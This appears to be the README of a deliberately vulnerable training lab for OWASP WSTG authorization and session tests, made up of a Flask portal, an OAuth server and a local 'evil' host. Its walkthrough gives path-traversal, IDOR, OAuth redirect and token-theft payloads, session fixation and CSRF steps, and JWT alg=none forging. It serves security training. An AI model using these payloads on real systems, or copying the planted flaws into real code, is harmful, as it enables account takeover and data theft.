# M03 - Authorization & Session Management

> **Intentionally vulnerable training target.** Every weakness here is deliberate.
> For authorised security testing and training only. All ports are published on
> `127.0.0.1`; do not expose this stack to any network you do not control.

Covers **16 WSTG tests**: `WSTG-ATHZ-01..05` (including sub-documents **05.1**
OAuth Authorization Server Weaknesses and **05.2** OAuth Client Weaknesses) and
`WSTG-SESS-01..11`.

## Topology

```
   :8300 ──▶ app  (Flask portal: authz, sessions, JWT, OAuth *client*)
                │  server-to-server code exchange
   :8310 ──▶ as   (compact Flask OAuth2 *authorization server*)
   :8320 ──▶ evil (in-range attacker host: Referer/code capture + CSRF page)
```

| Port | Service | Purpose |
|---|---|---|
| 8300 | app | main portal (primary HTTP) |
| 8310 | as | OAuth2 authorization server |
| 8320 | evil | in-range attacker host (never touches anything outside the lab) |

All state (users, sessions, documents, orders, messages, codes, tokens) is
in-process; restarting the stack resets the lab. No external datastore.

Seed accounts: `alice / Password123!` (user), `bob / Password123!` (user),
`admin / AdminPass123!` (admin). OAuth clients: `portal / portal-secret`,
`mobile / mobile-secret`. JWT HMAC secret: `secret` (deliberately weak).

## Run

```bash
docker compose up --build -d
docker compose ps

# probes (isolated venv; stdlib only)
python3 -m venv verify/.venv
verify/.venv/bin/pip install -r verify/requirements.txt
verify/.venv/bin/python ../../tools/runner.py .        # expect 16/16
```

If your Docker injects a host-side proxy from `~/.docker/config.json`, the
compose file already blanks it for builds. To use a real proxy instead:
`export LAB_HTTP_PROXY=http://your-proxy:port`.

Lab knobs (simulate elapsed time without waiting):
`POST :8300/debug/age-session` (`sid`, `seconds`) backdates a session;
`POST :8310/debug/expire-code` (`code`) backdates a code's expiry.
The AS authorize endpoint takes resource-owner credentials as query params
(`username`, `password`) as a lab shortcut for the login/consent UI.

## Attack walkthrough

### Authorization

| ID | How to exercise it |
|---|---|
| ATHZ-01 | `curl ':8300/files/download?name=../secret/flag.txt'` — also `..%2fsecret%2fflag.txt` and absolute `/srv/secret/flag.txt` or `/etc/passwd`. The sibling endpoint filters `../` once then decodes: `curl ':8300/files/fetch?path=....//secret/flag.txt'` and `..%252fsecret%252fflag.txt` both read the flag outside the docroot. |
| ATHZ-02 | Anonymous `GET /admin/users` (forced browsing) returns all emails. As bob: `POST /admin/announce` succeeds (no check); `GET /admin/export` → 403 but `POST /admin/export` → CSV (method switch); `GET /admin/panel` ships the admin UI to everyone with a JS-only `role === "admin"` check, and `POST /admin/settings` with `role=admin` in the body is trusted. |
| ATHZ-03 | As bob: `POST /profile/update` with `role=admin` (mass assignment). `GET /admin` flips 403 → 200. |
| ATHZ-04 | As bob: `GET /documents/1` reads alice's notes; `POST /documents/1/edit` rewrites them. As alice: `GET /orders/1002` reads bob's order. `GET /api/users` leaks alice's inbox UUID; `GET /messages/<uuid>` reads it. |
| ATHZ-05 | See below — both OAuth sides are real, hand-built servers. |

#### ATHZ-05 / 05.1 — Authorization Server (`:8310`)

- **redirect_uri substring match**: `/oauth/authorize?...&redirect_uri=http://127.0.0.1:8320/steal?legit=http://127.0.0.1:8300/oauth/callback` passes validation and the code lands on the attacker host (`GET :8320/logs`). `.../oauth/callback/../evil` also passes.
- **Code replay**: exchange the same `code` twice at `/oauth/token` — both succeed.
- **Expired code**: `POST /debug/expire-code` then exchange — still accepted.
- **No client binding**: redeem portal's code with `client_id=mobile&client_secret=mobile-secret`.
- **Scope escalation**: authorize `scope=read`, then request `scope=admin` at the token endpoint; `GET /api/resource` with that token dumps every user's private data.
- **Secret in URL**: `POST /oauth/token?client_id=portal&client_secret=portal-secret&code=...&grant_type=authorization_code` works (secret logged in access logs/Referer).

#### ATHZ-05 / 05.2 — Client (`:8300`)

- **No state / login CSRF**: `GET /oauth/login` emits no `state`. Obtain a code for *bob* at the AS, then make *alice's* browser hit `GET /oauth/callback?code=<bobcode>` — alice's session becomes bob.
- **PKCE downgrade**: authorize with `code_challenge=...&code_challenge_method=plain`, then exchange **without** `code_verifier` — accepted.
- **Open redirect**: `GET /redirect?to=http://127.0.0.1:8320/steal` → 302 off-site.
- **Referer token leak**: `GET /oauth/connected?access_token=<tok>` embeds `:8320/pixel`; the Referer carries the token to the attacker host, which replays it at `/oauth/userinfo`.
- **Implicit flow**: `response_type=token` returns `#access_token=...` in the URL fragment.

### Session management

| ID | How to exercise it |
|---|---|
| SESS-01 | Two `GET /` requests yield `SID=1001`, `SID=1002` — a plain counter. Pre-set the predicted next id, let the victim log in, and the predicted id is their authenticated session. |
| SESS-02 | Inspect `Set-Cookie: SID=...; Path=/` — no `HttpOnly`, `Secure` or `SameSite`. |
| SESS-03 | Send `Cookie: SID=9999...` (any value) to `/`, then `POST /login` — the id is adopted and never rotated; the fixated id authenticates as the victim. |
| SESS-04 | `GET /api/me?sid=<id>` works with no cookie; `/dashboard?sid=<id>` embeds the id in a hidden field and loads `:8320/pixel`, leaking the full URL (with sid) via Referer — read `:8320/logs`. |
| SESS-05 | Open `:8320/csrf` (auto-submit form) or replay: `POST /transfer` with only `Cookie: SID=...`, `Origin: http://127.0.0.1:8320` and body `to=bob&amount=50` — balance moves. |
| SESS-06 | `POST /logout`, then replay the old `SID` on `/api/me` — still authenticated (server record never invalidated). |
| SESS-07 | `GET /api/session-policy` → all timeouts `null`. Backdate a session 30 days via `POST /debug/age-session` — it still authenticates. |
| SESS-08 | Anonymous: `POST /reset/request` (`username=admin`) → token; `POST /reset/confirm` sets the same `session['user']` the app trusts — `GET /admin` → 200 with no password ever supplied. |
| SESS-09 | Take alice's numeric `SID` (predictable, plain HTTP), replay it with a different User-Agent and `X-Forwarded-For` — full session + private documents, no client binding. |
| SESS-10 | `POST /api/token` (alice) → HS256 JWT. (1) Forge `alg=none` with `role=admin` → `/api/v2/admin` 200. (2) Brute-force the signature against a small wordlist → secret `secret`; sign an admin token. (3) Sign a token with `exp` in the past → `/api/v2/me` still accepts it. |
| SESS-11 | Log alice in 5 times; all 5 sessions work concurrently. `POST /account/password` reports `sessions_invalidated: 0` and every old session survives. |

## Notes

- Probes are idempotent: they reset roles/settings they change, restore edited
  documents, and re-run cleanly (`16/16` twice in a row).
- The `evil` host only ever receives traffic from the lab itself; no outbound
  calls to third-party services are made.